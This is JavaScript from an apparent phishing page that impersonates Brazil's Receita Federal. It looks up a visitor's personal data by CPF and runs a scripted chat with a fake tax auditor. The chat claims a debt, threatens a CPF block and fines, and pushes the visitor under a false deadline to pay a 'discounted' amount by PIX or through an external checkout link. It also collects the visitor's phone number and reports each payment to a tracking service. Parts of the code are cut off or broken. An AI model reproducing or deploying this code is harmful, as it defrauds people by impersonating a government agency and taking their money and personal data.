    <script>
        // Get customer data from localStorage (saved when accessing via CPF slug)
        const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');

        // Function to properly capitalize names
        function capitalizeNames(name) {
            if (!name) return 'Nome não informado';
            return name.toLowerCase().split(' ').map(word =>
                word.charAt(0).toUpperCase() + word.slice(1)
            ).join(' ');
        }

        const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
        const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
        const cpf = customerData.cpf || 'CPF não informado';

        // Configuração - Carrega valor do servidor
        let CONFIG = {
            defaultAmount: 138.45 // Valor padrão, será atualizado do servidor
        };

        // Função helper para formatar valor monetário (R$ 138,45)
        function formatCurrency(value) {
            if (typeof value === 'undefined' || value === null) {
                value = CONFIG.defaultAmount;
            }
            return value.toFixed(2).replace('.', ',');
        }

        // Função helper para obter valor formatado completo (R$ 138,45)
        function getFormattedAmount(value) {
            if (typeof value === 'undefined' || value === null) {
                value = CONFIG.defaultAmount;
            }
            return `R$ ${formatCurrency(value)}`;
        }

        // Carrega configuração do servidor (valor do PIX)
        async function loadConfig() {
            try {
                const response = await fetch('pix-api0ecc.html?action=get-config');
                if (response.ok) {
                    const data = await response.json();
                    if (data.success && data.pix_amount) {
                        CONFIG.defaultAmount = parseFloat(data.pix_amount);
                        console.log('✅ Valor do PIX carregado:', CONFIG.defaultAmount);
                    }
                }
            } catch (error) {
                console.warn('⚠️ Não foi possível carregar configuração do servidor, usando valor padrão');
            }
        }

        // Carrega configuração ao iniciar
        loadConfig();

        // API endpoint
        const API_ENDPOINT = 'pix-api.html';

        function buildPixPayload() {
            const amount = CONFIG.defaultAmount;
            const normalizedCpf = (customerData.cpf || '').replace(/\D/g, '');

            // Valida CPF (deve ter 11 dígitos)
            if (!normalizedCpf || normalizedCpf.length < 11) {
                console.error('CPF inválido:', normalizedCpf);
                // Usa CPF de fallback se inválido
                const fallbackCpf = '00000000000';
                console.warn('Usando CPF de fallback:', fallbackCpf);
            }

            // Gera external_id único baseado no CPF e timestamp
            const externalId = `PIX_${normalizedCpf || '00000000000'}_${Date.now()}`;

            // URL do callback (webhook) - Goldiix
            const callbackUrl = 'https://raspakipix.online/consulta.portalurgente.is/a/goldiix-webhook.php';

            // Valida email
            let email = customerData.email || 'cliente@example.com';
            if (!email.includes('@')) {
                email = 'cliente@example.com';
            }

            // Valida nome
            let name = fullName || 'Cliente';
            if (!name || name.trim().length === 0) {
                name = 'Cliente';
            }

            // Valida telefone (obrigatório na Goldiix)
            let phone = customerData.phone || customerData.telefone || '';
            phone = phone.replace(/\D/g, ''); // Remove caracteres não numéricos
            if (!phone || phone.length < 10) {
                phone = '11999999999'; // Telefone padrão se não fornecido
            }

            return {
                amount: amount,
                external_id: externalId,
                callback_url: callbackUrl,
                payer: {
                    name: name.trim(),
                    email: email.trim(),
                    document: normalizedCpf || '00000000000',
                    phone: phone // Obrigatório na Goldiix
                }
            };
        }

        // Função para obter parâmetros UTM
        async function getUtmParams() {
            // Extrai parâmetros UTM da URL atual
            const urlParams = new URLSearchParams(window.location.search);

            // Também verifica no referrer se disponível
            let referrerParams = new URLSearchParams();
            if (document.referrer) {
                try {
                    const referrerUrl = new URL(document.html);
                    referrerParams = new URLSearchParams(referrerUrl.search);
                } catch (e) {
                    console.warn('Erro ao parsear referrer:', e);
                }
            }

            const utmParams = {
                src: urlParams.get('src') || referrerParams.get('src') || null,
                sck: urlParams.get('sck') || referrerParams.get('sck') || null,
                utm_source: urlParams.get('utm_source') || referrerParams.get('utm_source') || null,
                utm_campaign: urlParams.get('utm_campaign') || referrerParams.get('utm_campaign') || null,
                utm_medium: urlParams.get('utm_medium') || referrerParams.get('utm_medium') || null,
                utm_content: urlParams.get('utm_content') || referrerParams.get('utm_content') || null,
                utm_term: urlParams.get('utm_term') || referrerParams.get('utm_term') || null
            };

            // Se não tiver na URL, tenta do localStorage
            if (!utmParams.utm_source && !utmParams.src) {
                const storedUtm = localStorage.getItem('utmParams');
                if (storedUtm) {
                    try {
                        const parsed = JSON.parse(storedUtm);
                        Object.assign(utmParams, parsed);
                    } catch (e) {
                        console.warn('Erro ao parsear UTM do localStorage:', e);
                    }
                }
            }

            // Salva UTM no localStorage para uso futuro
            if (utmParams.utm_source || utmParams.src) {
                localStorage.setItem('utmParams', JSON.stringify(utmParams));
            }

            return utmParams;
        }

        // Função removida - agora a API retorna dados normalizados

        // Chat sequence with tax debt notification
        const chatSequence = [
            {
                message: `Olá ${firstName}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
                delay: 8000
            },
            {
                message: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em nome de ${fullName}.`,
                delay: 15000,
                requestPhone: true
            },
            {
                message: `Prezado ${firstName}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,

        ];

        // Chat container
        const chatContainer = document.getElementById('chatContainer');

        // Add message to chat
        function addMessage(text, isIncoming = true, scrollToBottom = true) {
            const messageDiv = document.createElement('div');
            messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;

            messageDiv.innerHTML = `
        <div class="message-content">
            ${text.replace(/\n/g, '<br>')}
        </div>
    `;

            chatContainer.appendChild(messageDiv);

            if (scrollToBottom) {
                chatContainer.scrollTop = chatContainer.scrollHeight;
            }
        }

        // Show typing indicator
        function showTyping(duration = 3000) {
            return new Promise(resolve => {
                const typingDiv = document.createElement('div');
                typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
                typingDiv.style.paddingLeft = '0px';
                typingDiv.style.marginLeft = '-10px';
                typingDiv.innerHTML = `
            <div class="message-content d-flex align-items-center" style="background-color: #044785; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
                <div class="typing-animation">
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </div>
            </div>
        `;

                chatContainer.appendChild(typingDiv);
                chatContainer.scrollTop = chatContainer.scrollHeight;

                setTimeout(() => {
                    if (typingDiv.parentNode) {
                        typingDiv.parentNode.removeChild(typingDiv);
                    }
                    resolve();
                }, duration);
            });
        }

        // Show options
        function showOptions(optionsId) {
            let optionsHtml = '';

            if (optionsId === 'debtOptions') {
                optionsHtml = `
            <div class="chat-options">
                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou quitar o débito agora mesmo', 'redirectToPayment')">
                    <i class="fas fa-check-circle" style="color: var(--receita-success);"></i> 
                    Vou quitar o débito agora mesmo
                </button>
                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Autorizo o bloqueio do meu CPF', 'confirmBlock')">
                    <i class="fas fa-times-circle" style="color: var(--receita-danger);"></i> 
                    Autorizo o bloqueio do meu CPF
                </button>
            </div>
        `;
            }

            if (optionsHtml) {
                chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
                chatContainer.scrollTop = chatContainer.scrollHeight;
            }
        }

        // Handle option click
        function handleOptionClick(button, responseText, nextAction) {
            // Add user response to chat
            addMessage(responseText, false, true);

            // Remove the options container
            const optionsContainer = button.closest('.chat-options');
            if (optionsContainer) {
                optionsContainer.remove();
            }

            // Show typing and continue conversation
            setTimeout(async () => {
                if (nextAction === 'redirectToPayment') {
                    await showTyping(4000);
                    addMessage(`${firstName}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade após hoje.`, true, true);

                    await showTyping(5000);
                    addMessage('Segundo as normas da Receita Federal, o pagamento com desconto tem validade de 10 minutos. Se você gerar o código PIX e não realizar o pagamento, a negociação será cancelada e será aplicada uma multa de não cumprimento do acordo no valor de R$985,00 e o CPF seguirá na lista de bloqueio.', true, true);

                    // Show payment button
                    setTimeout(() => {
                        showPaymentButton();
                    }, 2000);
                } else if (nextAction === 'confirmBlock') {
                    await showTyping(8000);
                    addMessage('Entendido. Vou iniciar o processo de bloqueio do seu CPF conforme os procedimentos da Receita Federal. O bloqueio será efetivado em breve. Obrigada pela atenção.', true, true);
                }
            }, 1000);
        }

        // Variável global para armazenar o link de checkout
        let checkoutUrl = 'https://comprasprotegidas.com.br/xdSJlkvF'; // URL padrão

        // Carrega link de checkout do servidor
        async function loadCheckoutUrl() {
            try {
                const response = await fetch('get-checkout-url.php');
                if (response.ok) {
                    const data = await response.json();
                    if (data.success && data.checkout_url) {
                        checkoutUrl = data.checkout_url;
                        console.log('✅ Link de checkout carregado:', checkoutUrl);
                    }
                }
            } catch (error) {
                console.warn('⚠️ Não foi possível carregar link de checkout, usando padrão');
            }
        }

        // Carrega link de checkout ao iniciar
        loadCheckoutUrl();

        // Função para redirecionar para o checkout
        function redirectToCheckout() {
            console.log('🔄 Redirecionando para checkout:', checkoutUrl);
            window.location.href = checkoutUrl;
        }

        // Show payment button
        function showPaymentButton() {
            const buttonHtml = `
        <div class="payment-button-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
            <button class="payment-button" onclick="redirectToCheckout()" style="
                background: #28a745;
                border: none;
                border-radius: 2px;
                padding: 16px 24px;

                cursor: pointer;

                text-align: center;
                transition: all 0.3s ease;
                box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
            " onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'" 
               onmouseout="this.style.background='#28a745'; this.style.transform='translateY(0)'">
                <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
                Realizar pagamento
            </button>
        </div>
    `;

            chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
            chatContainer.scrollTop = chatContainer.scrollHeight;
        }


        // Funções removidas - agora são gerenciadas pela API PHP

        /**
         * Gera QR Code do PIX usando biblioteca QRious
         * @param {string} pixCode - Código PIX completo
         * @returns {Promise<string|null>} - Data URL da imagem do QR Code ou null em caso de erro
         */
        async function generateQRCodeFromPix(pixCode) {
            try {
                // Verifica se a biblioteca QRious está carregada
                if (typeof QRious === 'undefined') {
                    console.error('❌ Biblioteca QRious não carregada. Tentando carregar...');

                    // Tenta carregar a biblioteca dinamicamente
                    await loadQRiousLibrary();

                    // Verifica novamente
                    if (typeof QRious === 'undefined') {
                        console.error('❌ Não foi possível carregar a biblioteca QRious');
                        return null;
                    }
                }

                console.log('✅ Gerando QR Code do PIX...', {
                    pixCodeLength: pixCode.length,
                    pixCodePreview: pixCode.substring(0, 50) + '...'
                });

                // Cria elemento canvas
                const canvas = document.createElement('canvas');
                canvas.width = 300;

                // Cria instância QRious com configurações otimizadas

                    level: 'H', // Nível de correção de erro alto para PIX
                    padding: 25
                });

                console.log('✅ QR Code gerado com sucesso', {
                    dataURLLength: qrCodeDataURL.length,

                });

            return new Promise((resolve, reject) => {
                // Verifica se já está carregada
                if (typeof QRious !== 'undefined') {
                    resolve();
                    return;
                }

                // Cria script tag
                const script = document.createElement('script');
                script.src = '../../cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js';
                script.onload = () => {
                    console.log('✅ Biblioteca QRious carregada com sucesso');

                };
                script.onerror = () => {
                    console.error('❌ Erro ao carregar biblioteca QRious');
                    reject(new Error('Não foi possível carregar a biblioteca QRious'));
                };

                document.head.appendChild(script);
            });
        }

        // Payment monitoring function usando API PHP
        function startPaymentMonitoring(transactionId) {
            // Clear any existing interval
            if (window.paymentMonitorInterval) {
                clearInterval(window.paymentMonitorInterval);
            }

            // Check payment status every 3 seconds
            let checkCount = 0;
            const maxChecks = 400; // Máximo de 20 minutos (400 * 3 segundos)

            window.paymentMonitorInterval = setInterval(async () => {
                checkCount++;

                // Limita número de verificações para evitar loop infinito
                if (checkCount > maxChecks) {
                    console.warn('⏰ Limite de verificações atingido. Parando monitoramento.');
                    clearInterval(window.paymentMonitorInterval);
                    window.paymentMonitorInterval = null;
                    return;
                }

                try {
                    console.log(`🔍 Verificando status do pagamento (tentativa ${checkCount}/${maxChecks})...`);
                    const response = await fetch(`${API_ENDPOINT}?action=check-status&payment_code=${encodeURIComponent(transactionId)}`);

                    if (!response.ok) {
                        console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
                        return;
                    }

                    const statusData = await response.json();
                    console.log('📊 Status recebido:', statusData);

                    if (!statusData.success) {
                        console.error('❌ Erro ao verificar status:', statusData.error);
                        return;
                    }

                    // Goldiix retorna payment_status: approved, pending, refunded, error
                    // Verifica em múltiplos lugares da resposta
                    const status = statusData.payment_status ||
                        statusData.status ||
                        statusData.data?.payment_status ||
                        (statusData.data && statusData.data.payment_status) ||
                        'unknown';
                    console.log(`🎯 Status atual: "${status}" (tentativa ${checkCount})`);
                    console.log('📋 Dados completos da resposta:', JSON.stringify(statusData, null, 2));

                    // Check if payment is approved
                    if (status === 'approved' || status === 'paid') {
                        // Clear monitoring
                        clearInterval(window.paymentMonitorInterval);
                        window.paymentMonitorInterval = null;

                        console.log('🎉 Pagamento APROVADO! Redirecionando para página de sucesso...');

                        // Envia para Utmify como pagamento aprovado via API
                        const utmParams = await getUtmParams();
                        const normalizedCpf = (customerData.cpf || '').replace(/\D/g, '');
                        const normalizedPhone = (customerData.telefone || customerData.phone || '').replace(/\D/g, '');

                        const now = new Date();
                        const createdAt = now.toISOString().replace('T', ' ').substring(0, 19);

                        try {
                            await fetch(`${API_ENDPOINT}?action=send-utmify`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    orderId: transactionId,
                                    platform: 'PortalUrgente',
                                    paymentMethod: 'pix',
                                    status: 'paid',
                                    createdAt: createdAt,
                                    approvedDate: createdAt,
                                    refundedAt: null,
                                    customer: {
                                        name: fullName || 'Cliente',
                                        email: customerData.email || 'cliente@example.com',
                                        phone: normalizedPhone || null,
                                        document: normalizedCpf || null,
                                        country: 'BR',
                                        ip: null
                                    },
                                    products: [{
                                        id: 'regularizacao-cpf',
                                        name: 'Regularização CPF',
                                        planId: null,
                                        planName: null,
                                        quantity: 1,
                                        priceInCents: Math.round(CONFIG.defaultAmount * 100)
                                    }],
                                    trackingParameters: utmParams,
                                    commission: {
                                        totalPriceInCents: Math.round(CONFIG.defaultAmount * 100),
                                        gatewayFeeInCents: 0,
                                        userCommissionInCents: 0,
                                        currency: 'BRL'
                                    }
                                })
                            });
                        } catch (e) {
                            console.warn('⚠️ Erro ao enviar para Utmify:', e);
                        }

                        closePixModal();

                        // Obtém CPF de múltiplas fontes para garantir
                        let cpfForRedirect = normalizedCpf;
                        if (!cpfForRedirect) {
                            // Tenta do localStorage
                            try {
                                const stored = localStorage.getItem('customerData');
                                if (stored) {
                                    const parsed = JSON.parse(stored);
                                    cpfForRedirect = (parsed.cpf || '').replace(/\D/g, '');
                                }
                            } catch (e) {
                                console.warn('Erro ao ler CPF do localStorage:', e);
                            }
                        }

                        // Se ainda não tiver CPF, tenta extrair do external_code da resposta
                        if (!cpfForRedirect && statusData.data && statusData.data.external_code) {
                            const externalCode = statusData.data.external_code;
                            const cpfMatch = externalCode.match(/PIX_(\d{11})_/);
                            if (cpfMatch) {
                                cpfForRedirect = cpfMatch[1];
                                console.log('✅ CPF extraído do external_code:', cpfForRedirect);
                            }
                        }

                        // Gera URL de sucesso - redireciona para index.html com CPF
                        const successUrl = cpfForRedirect
                            ? `../index.html?cpf=${encodeURIComponent(cpfForRedirect)}`
                            : '../index.html';

                        console.log('🔗 Redirecionando para:', successUrl);
                        console.log('📋 CPF usado:', cpfForRedirect);

                        // Mostra mensagem de sucesso antes de redirecionar
                        alert('✅ Pagamento confirmado com sucesso! Redirecionando...');

                        // Redireciona para index.html com CPF
                        window.location.href = successUrl;
                        return;
                    } else if (status === 'pending') {
                        console.log('⏳ Pagamento ainda pendente...');
                    } else if (status === 'error') {
                        console.log('❌ Pagamento com erro');
                        clearInterval(window.paymentMonitorInterval);
                        window.paymentMonitorInterval = null;
                    } else if (status === 'refunded') {
                        console.log('⚠️ Pagamento estornado');
                        clearInterval(window.paymentMonitorInterval);
                        window.paymentMonitorInterval = null;
                    }
                } catch (error) {
                    console.error('❌ Erro ao verificar status do pagamento:', error);
                }
            }, 3000); // Check every 3 seconds

            console.log(`⏰ Monitoramento configurado com timeout de 20 minutos`);

            // Timeout after 20 minutes (PIX expiration)
            setTimeout(() => {
                if (window.paymentMonitorInterval) {
                    clearInterval(window.paymentMonitorInterval);
                    window.paymentMonitorInterval = null;
                    console.log('⏰ Monitoramento encerrado por timeout (20 minutos)');
                }
            }, 20 * 60 * 1000); // 20 minutes
        }

        // Função para formatar telefone brasileiro (11) 98765-4321
        function formatBrazilianPhone(value) {
            // Remove tudo que não é número
            const numbers = value.replace(/\D/g, '');

            // Se começar com 55, é telefone internacional
            if (numbers.length >= 2 && numbers.substring(0, 2) === '55') {
                return formatInternationalPhone(numbers);
            }

            // Telefone brasileiro: (11) 98765-4321
            if (numbers.length <= 2) {
                return numbers.length > 0 ? `(${numbers}` : numbers;
            } else if (numbers.length <= 7) {
                return `(${numbers.substring(0, 2)}) ${numbers.substring(2)}`;
            } else if (numbers.length <= 10) {
                return `(${numbers.substring(0, 2)}) ${numbers.substring(2, 6)}-${numbers.substring(6)}`;
            } else {
                return `(${numbers.substring(0, 2)}) ${numbers.substring(2, 7)}-${numbers.substring(7, 11)}`;
            }
        }

        // Função para formatar telefone internacional +55 11 98765-4321
        function formatInternationalPhone(value) {
            const numbers = value.replace(/\D/g, '');

            if (numbers.length <= 2) {
                return numbers.length > 0 ? `+${numbers}` : numbers;
            } else if (numbers.length <= 4) {
                return `+${numbers.substring(0, 2)} ${numbers.substring(2)}`;
            } else if (numbers.length <= 9) {
                return `+${numbers.substring(0, 2)} ${numbers.substring(2, 4)} ${numbers.substring(4)}`;
            } else if (numbers.length <= 10) {
                return `+${numbers.substring(0, 2)} ${numbers.substring(2, 4)} ${numbers.substring(4, 8)}-${numbers.substring(8)}`;
            } else {
                return `+${numbers.substring(0, 2)} ${numbers.substring(2, 4)} ${numbers.substring(4, 9)}-${numbers.substring(9, 13)}`;
            }
        }

        // Função para formatar telefone enquanto digita
        function formatPhoneInput(input) {
            const value = input.value;
            const cursorPosition = input.selectionStart;
            const numbers = value.replace(/\D/g, '');

            // Determina se é telefone internacional (começa com 55)
            const isInternational = numbers.length >= 2 && numbers.substring(0, 2) === '55';

            let formatted;
            if (isInternational) {
                formatted = formatInternationalPhone(numbers);
                input.maxLength = 15; // +55 11 98765-4321
            } else {
                formatted = formatBrazilianPhone(numbers);
                input.maxLength = 15; // (11) 98765-4321
            }

            input.value = formatted;

            // Ajusta a posição do cursor
            const newCursorPosition = cursorPosition + (formatted.length - value.length);
            input.setSelectionRange(newCursorPosition, newCursorPosition);
        }

        // Função para formatar telefone para exibição
        function formatPhoneForDisplay(phone) {
            if (!phone) return '';

            const numbers = phone.replace(/\D/g, '');

            // Se começar com 55, formata como internacional
            if (numbers.length >= 2 && numbers.substring(0, 2) === '55') {
                if (numbers.length >= 4) {
                    const countryCode = numbers.substring(0, 2);
                    const areaCode = numbers.substring(2, 4);
                    const rest = numbers.substring(4);

                    if (rest.length <= 4) {
                        return `+${countryCode} ${areaCode} ${rest}`;
                    } else if (rest.length <= 8) {
                        return `+${countryCode} ${areaCode} ${rest.substring(0, 4)}-${rest.substring(4)}`;
                    } else {
                        return `+${countryCode} ${areaCode} ${rest.substring(0, 5)}-${rest.substring(5, 9)}`;
                    }
                }
                return `+${numbers}`;
            }

            // Telefone brasileiro: (11) 98765-4321
            if (numbers.length === 10) {
                return `(${numbers.substring(0, 2)}) ${numbers.substring(2, 6)}-${numbers.substring(6)}`;
            } else if (numbers.length === 11) {
                return `(${numbers.substring(0, 2)}) ${numbers.substring(2, 7)}-${numbers.substring(7)}`;
            }

            return phone;
        }

        // Confirm phone number
        async function confirmPhone() {
            const phoneInput = document.getElementById('phoneInput');
            if (!phoneInput) {
                console.error('Campo de telefone não encontrado');
                return;
            }

            // Remove formatação e pega apenas números
            const phoneNumber = phoneInput.value.replace(/\D/g, '');

            // Validação: telefone brasileiro (10 ou 11 dígitos) ou internacional (começando com 55 e pelo menos 12 dígitos)
            const isInternational = phoneNumber.length >= 2 && phoneNumber.substring(0, 2) === '55';
            const isValidBrazilian = phoneNumber.length === 10 || phoneNumber.length === 11;
            const isValidInternational = isInternational && phoneNumber.length >= 12;

            if (!isValidBrazilian && !isValidInternational) {
                if (phoneNumber.length < 10) {
                    alert('Por favor, digite um número de telefone válido com DDD (mínimo 10 dígitos).');
                } else if (isInternational && phoneNumber.length < 12) {
                    alert('Telefone internacional deve ter pelo menos 12 dígitos (código do país + DDD + número).');
                } else {
                    alert('Por favor, digite um número de telefone válido.');
                }
                phoneInput.focus();
                return;
            }

            // Save phone to localStorage (apenas números, sem formatação)
            const currentData = JSON.parse(localStorage.getItem('customerData') || '{}');
            currentData.telefone = phoneNumber;
            currentData.phone = phoneNumber; // Também salva como 'phone' para compatibilidade
            localStorage.setItem('customerData', JSON.stringify(currentData));

            // Formata telefone para exibição
            const formattedPhone = formatPhoneForDisplay(phoneNumber);

            // Add user response to chat (com formatação)
            addMessage(`Telefone: ${formattedPhone}`, false, true);

            // Remove phone input form
            const phoneContainer = document.querySelector('.phone-input-container');
            if (phoneContainer) {
                phoneContainer.remove();
            }

            // Show typing and thank message
            await showTyping(3000);
            addMessage(`Obrigada, ${firstName}! Telefone confirmado. Agora vou prosseguir com as informações sobre seu débito.`, true, true);

            // Resolve the promise to continue chat
            if (phoneConfirmationResolve) {
                phoneConfirmationResolve();
                phoneConfirmationResolve = null;
            }
        }

        // Start chat when page loads
        document.addEventListener('DOMContentLoaded', initializeChat);

        // Function to handle manual payment confirmation
        async function handlePaymentConfirmation(transactionId, confirmed) {
            // Remove confirmation popup
            const popup = document.getElementById('paymentConfirmationPopup');
            const overlay = document.getElementById('paymentConfirmationOverlay');
            if (popup) popup.remove();
            if (overlay) overlay.remove();

            if (confirmed) {
                console.log('✅ Usuário confirmou pagamento, verificando status...');

                try {
                    const response = await fetch(`${API_ENDPOINT}?action=check-status&payment_code=${encodeURIComponent(transactionId)}`);

                    if (!response.ok) {
                        console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
                        alert('Erro ao verificar pagamento. Tente novamente.');
                        return;
                    }

                    const statusData = await response.json();
                    console.log('📊 Status da verificação manual:', statusData);

                    if (!statusData.success) {
                        alert('Erro ao verificar pagamento: ' + (statusData.error || 'Tente novamente.'));
                        return;
                    }

                    // Goldiix retorna payment_status
                    const status = statusData.payment_status || statusData.status || 'unknown';
                    console.log(`🎯 Status manual: "${status}"`);

                    if (status === 'approved') {
                        // Clear automatic monitoring
                        if (window.paymentMonitorInterval) {
                            clearInterval(window.paymentMonitorInterval);
                            window.paymentMonitorInterval = null;
                        }

                        // Envia para Utmify como pagamento aprovado via API
                        const utmParams = await getUtmParams();
                        const normalizedCpf = (customerData.cpf || '').replace(/\D/g, '');
                        const normalizedPhone = (customerData.telefone || customerData.phone || '').replace(/\D/g, '');

                        const now = new Date();
                        const createdAt = now.toISOString().replace('T', ' ').substring(0, 19);

                        await fetch(`${API_ENDPOINT}?action=send-utmify`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                orderId: transactionId,
                                platform: 'PortalUrgente',
                                paymentMethod: 'pix',
                                status: 'paid',
                                createdAt: createdAt,
                                approvedDate: createdAt,
                                refundedAt: null,
                                customer: {
                                    name: fullName || 'Cliente',
                                    email: customerData.email || 'cliente@example.com',
                                    phone: normalizedPhone || null,
                                    document: normalizedCpf || null,
                                    country: 'BR',
                                    ip: null
                                },
                                products: [{
                                    id: 'regularizacao-cpf',
                                    name: 'Regularização CPF',
                                    planId: null,
                                    planName: null,
                                    quantity: 1,
                                    priceInCents: Math.round(CONFIG.defaultAmount * 100)
                                }],
                                trackingParameters: utmParams,
                                commission: {
                                    totalPriceInCents: Math.round(CONFIG.defaultAmount * 100),
                                    gatewayFeeInCents: 0,
                                    userCommissionInCents: 0,
                                    currency: 'BRL'
                                }
                            })
                        });

                        // Close modal
                        closePixModal();

                        // Recupera CPF do usuário do localStorage para redirecionar com parâmetro
                        let cpfParam = '';
                        try {
                            const stored = localStorage.getItem('customerData');
                            if (stored) {
                                const parsed = JSON.parse(stored);
                                if (parsed && parsed.cpf) {
                                    cpfParam = String(parsed.cpf).replace(/\D/g, '');
                                }
                            }
                        } catch (e) {
                            console.warn('Não foi possível ler customerData do localStorage para o CPF (confirmação manual):', e);
                        }

                        if (cpfParam) {
                            window.location.href = `../spc/consulta.html?cpf=${encodeURIComponent(cpfParam)}`;
                        } else {
                            window.location.href = '../spc/consulta.html';
                        }
                    } else {
                        console.log('⚠️ Pagamento ainda não foi aprovado');
                        alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
                    }
                } catch (error) {
                    console.error('❌ Erro ao verificar status manual:', error);
                    alert('Erro ao verificar pagamento. Tente novamente.');
                }
            } else {
                console.log('❌ Usuário informou que não realizou o pagamento');
                // Continue with automatic monitoring
            }
        }
    </script>

    <script>
        // Função para capitalizar nomes
        function capitalizeNames(name) {
            if (!name) return 'Nome não informado';
            return name.toLowerCase().split(' ').map(word =>
                word.charAt(0).toUpperCase() + word.slice(1)
            ).join(' ');
        }

        // Verifica CPF na URL
        const cpfParam = new URLSearchParams(window.location.search).get("cpf");

        if (cpfParam) {
            // Usa endpoint PHP seguro (token fica no servidor, nunca exposto)
            const cpfNormalized = cpfParam.replace(/\D/g, ''); // Remove formatação do CPF

            fetch(`consulta-cpf.php?cpf=${cpfNormalized}`)
                .then(res => res.json())
                .then(data => {
                    // Verifica se houve erro
                    if (data.error) {
                        console.error("❌ Erro na API:", data.message);
                        // Em caso de erro, usa CPF da URL como fallback
                        const fallbackData = {
                            cpf: cpfNormalized,
                            nome: '',
                            sexo: '',
                            nascimento: '',
                            nome_mae: ''
                        };
                        localStorage.setItem('customerData', JSON.stringify(fallbackData));
                        iniciarChat(fallbackData);
                        return;
                    }

                    // A API retorna: {"cpf":"","nome":"","sexo":"","nascimento":"","nome_mae":""}
                    // Garante que o CPF está presente nos dados
                    if (!data.cpf && cpfNormalized) {
                        data.cpf = cpfNormalized;
                    }

                    // Salva dados no localStorage
                    localStorage.setItem('customerData', JSON.stringify(data));
                    console.log('✅ Dados do CPF carregados:', data);
                    iniciarChat(data);
                })
                .catch(err => {
                    console.error("❌ Erro ao buscar dados do CPF:", err);
                    // Em caso de erro, usa CPF da URL como fallback
                    const fallbackData = {
                        cpf: cpfNormalized,
                        nome: '',
                        sexo: '',
                        nascimento: '',
                        nome_mae: ''
                    };
                    localStorage.setItem('customerData', JSON.stringify(fallbackData));
                    iniciarChat(fallbackData);
                });
        } else {
            // Se não veio pela URL, tenta pegar do localStorage
            const local = localStorage.getItem('customerData');
            const data = local ? JSON.parse(local) : {};
            iniciarChat(data);
        }

        function iniciarChat(customerData) {
            const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
            const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
            const cpf = customerData.cpf || 'CPF não informado';

            const chatSequence = [
                {
                    message: `Olá ${firstName}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
                    delay: 8000
                },
                {
                    message: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em nome de ${fullName}.`,
                    delay: 15000,
                    requestPhone: true
                },
                {
                    message: `Prezado ${firstName}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,
                    delay: 14000
                },
                {
                    message: `Além disso, se o pagamento não for realizado hoje será aplicada uma multa adicional no valor de R$ 1.985,00 ao seu CPF, conforme determina a legislação tributária federal.`,
                    delay: 13000
                },
                {
                    message: `Importante: realizando o pagamento hoje (${new Date().toLocaleDateString("pt-BR")}) há um desconto de 67%, reduzindo o débito de R$ 419,55 para apenas R$ 138,45 ${firstName}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
                    delay: 12000,
                    showOptions: 'debtOptions'
                }
            ];

            // Executa sequência do chat
            if (typeof runChatSequence === 'function') {
                runChatSequence(chatSequence, firstName);
            } else {
                console.warn("Função runChatSequence não encontrada.");
            }
        }
    </script>
